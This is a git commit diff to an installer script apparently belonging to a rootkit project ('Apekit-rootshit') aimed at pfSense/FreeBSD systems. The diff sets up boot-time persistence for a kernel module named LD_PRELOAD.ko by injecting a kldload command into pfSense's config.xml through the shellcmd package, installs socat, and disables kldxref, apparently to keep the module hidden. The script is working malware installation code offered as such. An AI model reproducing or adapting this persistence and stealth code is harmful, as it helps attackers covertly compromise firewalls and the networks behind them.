c2945af1d0f2f2952afe1d538ee6d767928fa3b9
Baremetal MSI <spark61974@gmail.com>
2025-02-18 14:53:06 -0500

    .

--- load_and_setup.sh
+++ load_and_setup.sh
@@ -20,15 +20,40 @@ cp "$LKM_NAME" /boot/modules/
 pkg install socat -y
 
 # achieve persistance by loading the module everytime the system boots
-cp ldpreload /usr/local/etc/rc.d/
-chmod +x /usr/local/etc/rc.d/ldpreload
-service ldpreload enable
-service ldpreload start
+# cp ldpreload /usr/local/etc/rc.d/
+# chmod +x /usr/local/etc/rc.d/ldpreload
+
+# service ldpreload start
+
+pkg install pfSense-pkg-shellcmd
+
+CONFIG_FILE="/conf/config.xml"
+MODULE_CMD="/sbin/kldload /boot/modules/LD_PRELOAD.ko"
+TEMP_FILE="/tmp/config.xml"
+# Backup the original config.xml
+cp "$CONFIG_FILE" "/conf/config.xml.bak"
+# Check if <shellcmd> section exists
+if grep -q "<shellcmd>" "$CONFIG_FILE"; then
+    # Append the command inside the existing <shellcmd> section
+    sed "/<shellcmd>/a \\
+        <command>$MODULE_CMD</command>" "$CONFIG_FILE" > "$TEMP_FILE"
+else
+    # Add a new <shellcmd> section before </pfsense>
+    sed "/<\/pfsense>/i \\
+    <shellcmd>\\
+        <command>$MODULE_CMD</command>\\
+    </shellcmd>" "$CONFIG_FILE" > "$TEMP_FILE"
+fi
+# Overwrite the original config.xml with the updated one
+mv "$TEMP_FILE" "$CONFIG_FILE"
+# Apply changes
+/etc/rc.reload_all
+
 
 # Disable kldxref by setting kldxref_enable="NO"
 sed -i '' 's/^kldxref_enable="YES"/kldxref_enable="NO"/' /etc/rc.conf
 
-kldload "/Apekit-rootshit/$LKM_NAME"
+# kldload "/Apekit-rootshit/$LKM_NAME"
 
 # mkdir /boot/kernel/.ko_backup/
 
